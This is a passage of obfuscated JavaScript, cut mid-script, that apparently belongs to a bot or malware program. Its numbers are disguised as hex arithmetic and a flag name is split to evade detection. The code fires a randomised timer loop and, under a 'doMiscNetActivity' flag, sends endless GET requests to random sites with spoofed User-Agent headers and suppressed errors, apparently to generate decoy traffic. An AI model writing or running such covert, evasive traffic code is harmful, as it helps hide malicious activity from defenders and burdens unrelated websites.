  for (let k = -0x1 * -0x1277 + 0x790 + -0x1a07; k < 0x129c + -0x1b37 + 0x89f * 0x1; k++)
    setTimeout(f, (0x5 * -0x570f + 0x11106 + 0x7c7 * 0x33) * k * getRandomInt(-0x2431 + 0x23c3 * 0x1 + 0x6f, 0x139c + 0x28c + 0x1625 * -0x1));
  setInterval(() => {
    f();
    for (let l = -0x2320 + 0x2682 + 0x1 * -0x362; l < 0xd * -0x17d + -0x1e53 + -0xc * -0x424; l++)
      setTimeout(f, (-0x35 * -0x8a7 + -0x8119 + 0xd96 * -0x7) * l * getRandomInt(-0x14a8 + 0x12b8 * -0x1 + 0x11 * 0x251, 0x711 * 0x2 + -0x2d2 + -0x107 * 0xb));
  }, -0x4b4bbf + 0x19ba4a + 0x385 * 0x1db1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x4 * 0x727 + -0x1d36 + 0x552a) * getRandomInt(0x469 * 0x1 + -0x11b3 + -0xd4b * -0x1, 0x1f51 + -0x2106 + 0x22 * 0xd));
}, 0x2 * -0xd59 + 0x1 * -0x2025 + 0x101 * 0x3b);